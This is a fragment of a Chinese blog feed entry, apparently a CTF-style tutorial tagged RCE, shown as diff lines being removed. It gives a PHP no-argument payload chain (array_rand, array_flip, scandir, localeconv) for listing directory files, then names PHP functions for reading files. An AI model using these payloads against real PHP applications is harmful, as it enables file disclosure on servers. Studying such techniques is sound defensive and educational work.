-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>
-
-<p>这种方法的优势是目标字符串在数组的任意位置都可以，缺点是该方法不是100%成功的，需要重放。</p>
-<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>命令执行</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
